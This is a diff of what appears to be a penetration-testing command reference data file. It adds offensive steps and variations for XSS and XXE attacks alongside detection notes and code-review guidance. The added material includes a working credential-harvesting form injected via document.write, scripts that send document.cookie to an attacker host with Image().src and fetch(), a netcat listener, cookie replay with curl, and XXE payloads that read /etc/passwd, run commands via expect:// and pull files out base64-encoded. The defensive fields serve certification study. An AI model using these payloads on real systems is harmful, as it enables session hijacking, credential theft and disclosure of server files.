         "impact": "Credential phishing under a trusted domain — unlike email phishing, the URL in the victim's browser is the legitimate application domain. Browser anti-phishing tools, smart screen, and user URL-checking habits provide no protection. Credentials submitted go directly to the attacker's listener/logger.",
         "detection": "[MITRE T1059.007] CSP: form-action 'self' blocks form submission to external domains — blocks this attack entirely. Web content scanning: stored content containing document.write + action=http://external detected. User report: unexpected login prompt on a page that doesn't normally require re-authentication.",
-        "artifacts": "Database: stored XSS payload with document.write and attacker IP. Attacker server log: POST/GET with username= and password= from victim. Victim browser history: form submitted to external IP."
-      }
+        "artifacts": "Database: stored XSS payload with document.write and attacker IP. Attacker server log: POST/GET with username= and password= from victim. Victim browser history: form submitted to external IP.",
+        "code_review": "RED FLAGS (source): user input written into HTML/JS without contextual encoding.\n  echo $_GET / <?= $_REQUEST ?>  |  el.innerHTML = userVal  |  document.write(  |  React dangerouslySetInnerHTML  |  Angular [innerHTML]  |  {{{ raw }}} (unescaped Handlebars)\nGREP:  grep -rniE \"innerHTML|outerHTML|document\\.write|insertAdjacentHTML|dangerouslySetInnerHTML|echo +\\$_|<\\?=\" .\nSAFE:  contextual output encoding (htmlspecialchars/textContent), auto-escaping templates, a strict CSP, and HttpOnly cookies."
+      },
+      "variations": [
+        {
+          "label": "Inject a credential-harvest form via document.write",
+          "command": "<script>document.write('<form action=\"http://<attacker>/log\"><input name=user><input name=pass type=password><input type=submit></form>')</script>"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Inject the fake login form",
+          "command": "# store the payload where victims render it"
+        },
+        {
+          "label": "Capture posted creds on your listener",
+          "command": "php -S 0.0.0.0:80   # or a simple logger"
+        }
+      ]
     },
     {
       "id": "xss-phishing-logger",
@@ -84596,10 +88778,6 @@ const COMMAND_DATA = {
       ],
       "variations": [
         {
-          "label": "Default (src include)",
-          "command": "<script src=http://<lhost>/script.js></script>"
-        },
-        {
           "label": "Bare src (no path)",
           "command": "<script src=http://<lhost>></script>"
         },
@@ -84637,7 +88815,8 @@ const COMMAND_DATA = {
         "why_it_works": "<script src=http://attacker.com/script.js></script> loads external JavaScript from the attacker's server. The browser requests and executes whatever script.js contains — the attacker can update the payload after injection without touching the stored XSS. This also bypasses payload length limits (the injected payload is short; all logic is in the external file). The browser's same-origin policy does not prevent loading external scripts via src=.",
         "impact": "Flexible persistent backdoor — the attacker can change script.js to update the payload (cookie stealer → keylogger → credential phishing → crypto miner) without re-exploiting the XSS. All victims who trigger the stored XSS run the current version of script.js.",
         "detection": "[MITRE T1059.007] CSP: script-src 'self' blocks script loading from external domains — this is the primary control. Network monitoring: <script src=http://external-IP> in stored content. Web application firewall: src= with external IP in stored fields. Script Subresource Integrity (SRI): if external scripts are legitimate, SRI hashes ensure they haven't been tampered.",
-        "artifacts": "Database: stored <script src=http://attacker-ip/...> payload. Access log (attacker): GET /script.js requests from victim IPs. Victim browser network: external script load request."
+        "artifacts": "Database: stored <script src=http://attacker-ip/...> payload. Access log (attacker): GET /script.js requests from victim IPs. Victim browser network: external script load request.",
+        "code_review": "RED FLAGS (source): user input written into HTML/JS without contextual encoding.\n  echo $_GET / <?= $_REQUEST ?>  |  el.innerHTML = userVal  |  document.write(  |  React dangerouslySetInnerHTML  |  Angular [innerHTML]  |  {{{ raw }}} (unescaped Handlebars)\nGREP:  grep -rniE \"innerHTML|outerHTML|document\\.write|insertAdjacentHTML|dangerouslySetInnerHTML|echo +\\$_|<\\?=\" .\nSAFE:  contextual output encoding (htmlspecialchars/textContent), auto-escaping templates, a strict CSP, and HttpOnly cookies."
       }
     },
     {
@@ -84720,8 +88899,33 @@ const COMMAND_DATA = {
         "why_it_works": "The full session hijack chain: (1) XSS payload executes in victim's browser, (2) document.location redirects or new Image().src exfiltrates document.cookie to attacker server, (3) attacker's PHP captures cookie, (4) attacker sets the stolen cookie in their own browser via DevTools or a cookie editor extension, (5) attacker's browser is now authenticated as the victim. The server sees a valid session cookie and has no way to distinguish the attacker from the legitimate user.",
         "impact": "Full account takeover without credentials — the attacker has the victim's authenticated session. All actions performed under that session appear as the victim: data access, settings changes, password reset, admin operations. Session fixation completes the attack if the cookie was predictable.",
         "detection": "[MITRE T1059.007] Session anomaly detection: same session ID used from two different IPs/User-Agents simultaneously. Geographic impossibility: session used from different countries within minutes. Re-authentication required for sensitive actions (MFA, password re-entry) — stolen cookie alone insufficient. Session binding to IP/fingerprint makes cookie reuse fail from different context.",
-        "artifacts": "Authentication log: same session ID from two different source IPs. Application log: actions taken with stolen session from attacker IP. If HttpOnly: cookie theft fails — script cannot read document.cookie."
-      }
+        "artifacts": "Authentication log: same session ID from two different source IPs. Application log: actions taken with stolen session from attacker IP. If HttpOnly: cookie theft fails — script cannot read document.cookie.",
+        "code_review": "RED FLAGS (source): user input written into HTML/JS without contextual encoding.\n  echo $_GET / <?= $_REQUEST ?>  |  el.innerHTML = userVal  |  document.write(  |  React dangerouslySetInnerHTML  |  Angular [innerHTML]  |  {{{ raw }}} (unescaped Handlebars)\nGREP:  grep -rniE \"innerHTML|outerHTML|document\\.write|insertAdjacentHTML|dangerouslySetInnerHTML|echo +\\$_|<\\?=\" .\nSAFE:  contextual output encoding (htmlspecialchars/textContent), auto-escaping templates, a strict CSP, and HttpOnly cookies."
+      },
+      "variations": [
+        {
+          "label": "Steal cookie to your server",
+          "command": "<script>new Image().src='http://<attacker>/c?='+document.cookie</script>"
+        },
+        {
+          "label": "fetch exfil",
+          "command": "<script>fetch('http://<attacker>/?c='+document.cookie)</script>"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Inject a cookie-stealer where an admin will view it",
+          "command": "<script>new Image().src='http://<attacker>/?c='+document.cookie</script>"
+        },
+        {
+          "label": "Receive the session cookie",
+          "command": "nc -lvnp 80   # or a web logger"
+        },
+        {
+          "label": "Replay the cookie to hijack the session",
+          "command": "curl -H \"Cookie: session=<stolen>\" <url>"
+        }
+      ]
     },
     {
       "type": "script",
@@ -85013,7 +89217,8 @@ const COMMAND_DATA = {
           "MITRE T1083",
           "MITRE T1190",
           "OWASP A05:2021"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): XML parser with DOCTYPE / external entities enabled.\n  PHP: libxml_disable_entity_loader(false) or old libxml  |  Java: DocumentBuilderFactory/SAXParser without disallow-doctype-decl  |  Python: lxml etree with resolve_entities=True\nGREP:  grep -rniE \"DocumentBuilderFactory|SAXParser|XMLReader|simplexml_load|loadXML|etree\\.(parse|fromstring)|libxml_\" .\nSAFE:  disable DOCTYPE + external entities (FEATURE_SECURE_PROCESSING, disallow-doctype-decl=true, resolve_entities=False)."
       }
     },
     {
@@ -85110,7 +89315,8 @@ const COMMAND_DATA = {
           "MITRE T1083",
           "MITRE T1190",
           "OWASP A05:2021"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): XML parser with DOCTYPE / external entities enabled.\n  PHP: libxml_disable_entity_loader(false) or old libxml  |  Java: DocumentBuilderFactory/SAXParser without disallow-doctype-decl  |  Python: lxml etree with resolve_entities=True\nGREP:  grep -rniE \"DocumentBuilderFactory|SAXParser|XMLReader|simplexml_load|loadXML|etree\\.(parse|fromstring)|libxml_\" .\nSAFE:  disable DOCTYPE + external entities (FEATURE_SECURE_PROCESSING, disallow-doctype-decl=true, resolve_entities=False)."
       }
     },
     {
@@ -85207,8 +89413,29 @@ const COMMAND_DATA = {
           "MITRE T1083",
           "MITRE T1190",
           "OWASP A05:2021"
-        ]
-      }
+        ],
+        "code_review": "RED FLAGS (source): XML parser with DOCTYPE / external entities enabled.\n  PHP: libxml_disable_entity_loader(false) or old libxml  |  Java: DocumentBuilderFactory/SAXParser without disallow-doctype-decl  |  Python: lxml etree with resolve_entities=True\nGREP:  grep -rniE \"DocumentBuilderFactory|SAXParser|XMLReader|simplexml_load|loadXML|etree\\.(parse|fromstring)|libxml_\" .\nSAFE:  disable DOCTYPE + external entities (FEATURE_SECURE_PROCESSING, disallow-doctype-decl=true, resolve_entities=False)."
+      },
+      "variations": [
+        {
+          "label": "Read /etc/passwd",
+          "command": "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>"
+        },
+        {
+          "label": "Parameter entity (bypass filters)",
+          "command": "<!DOCTYPE r [<!ENTITY % x SYSTEM \"file:///<file>\"> %x;]>"
+        }
+      ],
+      "steps": [
+        {
+          "label": "Define an external entity pointing at a file",
+          "command": "<!DOCTYPE email [ <!ENTITY company SYSTEM \"file:///<file>\"> ]>"
+        },
+        {
+          "label": "Reference it in a reflected XML field",
+          "command": "<email>&company;</email>"
+        }
+      ]
     },
     {
       "type": "payload",
@@ -85308,8 +89535,15 @@ const COMMAND_DATA = {
           "MITRE T1083",
           "MITRE T1190",
           "OWASP A05:2021"
-        ]
-      }
+        ],
+        "code_review": "RED FLAGS (source): XML parser with DOCTYPE / external entities enabled.\n  PHP: libxml_disable_entity_loader(false) or old libxml  |  Java: DocumentBuilderFactory/SAXParser without disallow-doctype-decl  |  Python: lxml etree with resolve_entities=True\nGREP:  grep -rniE \"DocumentBuilderFactory|SAXParser|XMLReader|simplexml_load|loadXML|etree\\.(parse|fromstring)|libxml_\" .\nSAFE:  disable DOCTYPE + external entities (FEATURE_SECURE_PROCESSING, disallow-doctype-decl=true, resolve_entities=False)."
+      },
+      "variations": [
+        {
+          "label": "expect wrapper (needs PHP expect ext)",
+          "command": "<!ENTITY company SYSTEM \"expect://id\">"
+        }
+      ]
     },
     {
       "type": "payload",
@@ -85409,8 +89643,15 @@ const COMMAND_DATA = {
           "MITRE T1083",
           "MITRE T1190",
           "OWASP A05:2021"
-        ]
-      }
+        ],
+        "code_review": "RED FLAGS (source): XML parser with DOCTYPE / external entities enabled.\n  PHP: libxml_disable_entity_loader(false) or old libxml  |  Java: DocumentBuilderFactory/SAXParser without disallow-doctype-decl  |  Python: lxml etree with resolve_entities=True\nGREP:  grep -rniE \"DocumentBuilderFactory|SAXParser|XMLReader|simplexml_load|loadXML|etree\\.(parse|fromstring)|libxml_\" .\nSAFE:  disable DOCTYPE + external entities (FEATURE_SECURE_PROCESSING, disallow-doctype-decl=true, resolve_entities=False)."
+      },
+      "variations": [
+        {
+          "label": "base64 to exfil binary/PHP files",
+          "command": "<!ENTITY company SYSTEM \"php://filter/convert.base64-encode/resource=<file>\">"
+        }
+      ]
     },
     {
       "type": "command",
@@ -85511,7 +89752,8 @@ const COMMAND_DATA = {
           "MITRE T1083",
           "MITRE T1190",
           "OWASP A05:2021"
-        ]
+        ],
+        "code_review": "RED FLAGS (source): XML parser with DOCTYPE / external entities enabled.\n  PHP: libxml_disable_entity_loader(false) or old libxml  |  Java: DocumentBuilderFactory/SAXParser without disallow-doctype-decl  |  Python: lxml etree with resolve_entities=True\nGREP:  grep -rniE \"DocumentBuilderFactory|SAXParser|XMLReader|simplexml_load|loadXML|etree\\.(parse|fromstring)|libxml_\" .\nSAFE:  disable DOCTYPE + external entities (FEATURE_SECURE_PROCESSING, disallow-doctype-decl=true, resolve_entities=False)."
       }
     },
     {
@@ -85742,8 +89984,8 @@ const COMMAND_DATA = {
       ]
     }
   ],
-  "totalCommands": 894,
-  "buildDate": "2026-08-18T12:33:28.256Z",
+  "totalCommands": 905,
+  "buildDate": "2026-08-26T15:24:21.766Z",
   "certifications": [
     "CDSA",
     "CPTS",
